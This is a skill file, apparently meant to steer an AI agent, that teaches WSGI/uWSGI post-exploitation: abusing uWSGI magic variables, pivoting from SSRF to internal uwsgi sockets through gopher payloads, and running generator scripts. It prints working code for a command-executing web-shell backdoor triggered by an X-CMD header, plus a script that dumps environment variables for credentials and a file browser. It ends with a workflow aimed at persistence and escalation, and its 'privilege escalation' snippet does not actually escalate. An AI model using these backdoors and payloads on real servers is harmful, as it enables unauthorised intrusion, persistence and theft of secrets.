---
name: wsgi-pentesting
description: Use this skill for WSGI/uWSGI post-exploitation attacks including magic variable exploitation, SSRF-to-uWSGI pivots via gopher protocol, and backdoor deployment. Trigger when the user mentions WSGI, uWSGI, uwsgi protocol, magic variables, UWSGI_FILE, SSRF to backend, or needs to exploit WSGI misconfigurations for RCE.
---

# WSGI/uWSGI Post-Exploitation Skill

This skill helps you exploit WSGI/uWSGI misconfigurations for remote code execution, information disclosure, and persistence.

## When to Use This Skill

Use this skill when:
- You've identified a WSGI/uWSGI backend behind a reverse proxy
- You have SSRF access to an internal uwsgi socket
- You need to exploit uWSGI magic variables for RCE
- You want to deploy persistent backdoors via WSGI
- You're investigating WSGI-related vulnerabilities

## Core Attack Vectors

### 1. Magic Variable Exploitation

uWSGI magic variables are special parameters that control how the instance loads applications. If a proxy maps user input to uwsgi params, you can achieve RCE.

#### Key Exploitable Variables

| Variable | Purpose | Example |
|----------|---------|--------|
| `UWSGI_FILE` | Load arbitrary Python file | `/app/?f=/tmp/backdoor.py` |
| `UWSGI_SCRIPT` | Load module:callable | `pkg.mod:application` |
| `UWSGI_MODULE` | Load Python module | `malicious.module` |
| `UWSGI_CALLABLE` | Call specific function | `evil_function` |
| `UWSGI_SETENV` | Set environment variables | `DJANGO_SETTINGS_MODULE=malicious` |
| `UWSGI_PYHOME` | Change Python venv | `/path/to/malicious/venv` |
| `UWSGI_CHDIR` | Change working directory | `/etc/` |

#### Common Misconfigurations

Look for these dangerous nginx mappings:

```nginx
# DANGEROUS: maps query args into uwsgi params
uwsgi_param UWSGI_FILE $arg_f;
# DANGEROUS: maps headers into uwsgi params  
uwsgi_param UWSGI_MODULE $http_x_mod;
# DANGEROUS: maps query args into callable
uwsgi_param UWSGI_CALLABLE $arg_c;
```

### 2. SSRF + uWSGI Protocol Pivot

If you have SSRF and the uWSGI instance listens on an internal TCP socket, you can craft raw uwsgi protocol packets via gopher.

#### Protocol Structure

```
Header (4 bytes):
  - modifier1 (1 byte): usually 0
  - datasize (2 bytes, little-endian): body length
  - modifier2 (1 byte): usually 0

Body:
  - Sequence of [key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]
```

#### Generate Gopher Payload

Use the bundled script to generate payloads:

```bash
python scripts/uwsgi_gopher_generator.py \
  --host 127.0.0.1 \
  --port 3031 \
  --uwsgi-file /app/profiles/malicious.py \
  --script-name /malicious.py
```

Or use the Python API:

```python
from scripts.uwsgi_gopher_generator import generate_uwsgi_gopher

params = {
    'SERVER_PROTOCOL': 'HTTP/1.1',
    'REQUEST_METHOD': 'GET',
    'PATH_INFO': '/',
    'UWSGI_FILE': '/app/profiles/malicious.py',
    'SCRIPT_NAME': '/malicious.py'
}

url = generate_uwsgi_gopher('127.0.0.1', 3031, params)
print(url)
```

### 3. Post-Exploitation Techniques

#### File-Based Backdoor

Generate a backdoor with the bundled script:

```bash
python scripts/uwsgi_backdoor_generator.py \
  --output backdoor.py \
  --trigger-header X-CMD \
  --response-type text/plain
```

Or create manually:

```python
# backdoor.py
import subprocess, base64

def application(environ, start_response):
    cmd = environ.get('HTTP_X_CMD', '')
    if cmd:
        result = subprocess.run(
            base64.b64decode(cmd),
            shell=True,
            capture_output=True,
            text=True
        )
        response = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
    else:
        response = 'Backdoor active'
    start_response('200 OK', [('Content-Type', 'text/plain')])
    return [response.encode()]
```

Load it with:
```
UWSGI_FILE=/path/to/backdoor.py
SCRIPT_NAME=/backdoor
```

#### Environment Variable Dumping

```python
# env_dump.py
import os, json

def application(environ, start_response):
    env_data = {
        'os_environ': dict(os.environ),
        'wsgi_environ': dict(environ)
    }
    start_response('200 OK', [('Content-Type', 'application/json')])
    return [json.dumps(env_data, indent=2).encode()]
```

#### File System Access

Combine `UWSGI_CHDIR` with a file-serving helper:

```python
# file_browser.py
import os

def application(environ, start_response):
    path = environ.get('PATH_INFO', '/')
    try:
        if os.path.isdir(path):
            files = os.listdir(path)
            content = '\n'.join(files)
        else:
            with open(path, 'r') as f:
                content = f.read()
        start_response('200 OK', [('Content-Type', 'text/plain')])
        return [content.encode()]
    except Exception as e:
        start_response('500 Error', [('Content-Type', 'text/plain')])
        return [str(e).encode()]
```

### 4. Privilege Escalation

If uWSGI runs with elevated privileges:

```python
# malicious_config.py
import os

# Override uWSGI configuration
os.environ['UWSGI_MASTER'] = '1'
os.environ['UWSGI_PROCESSES'] = '1'
os.environ['UWSGI_CHEAPER'] = '1'
```

Or use `UWSGI_SETENV` to modify environment:
```
uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
```

## Attack Workflow

### Step 1: Reconnaissance

1. Identify if target uses WSGI/uWSGI
2. Check for exposed uwsgi sockets (common ports: 3031, 5000, 8000)
3. Look for SSRF vulnerabilities that can reach internal sockets
4. Fingerprint proxy configuration (nginx, Apache mod_proxy_uwsgi)

### Step 2: Exploitation

1. **If magic variables are exposed via HTTP:**
   - Craft requests with controlled parameters
   - Use `UWSGI_FILE` to load attacker-controlled files
   - Use `UWSGI_MODULE` + `UWSGI_CALLABLE` for dynamic loading

2. **If SSRF to uwsgi socket exists:**
   - Generate gopher payload with `scripts/uwsgi_gopher_generator.py`
   - Set `UWSGI_FILE` to malicious payload
   - Send through SSRF sink

### Step 3: Post-Exploitation

1. Deploy persistent backdoor
2. Dump environment variables for credentials
3. Access sensitive files
4. Escalate privileges if possible

## Known Vulnerabilities

- **CVE-2023-27522**: Apache httpd 2.4.30–2.4.55 response smuggling with mod_proxy_uwsgi
- **CVE-2024-24795**: Apache httpd 2.4.59 HTTP response splitting

Check proxy versions and consider desync/smuggling as entry points.

## References

- [uWSGI Magic Variables Documentation](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
- [uWSGI Security Best Practices](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
- [The uwsgi Protocol (spec)](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
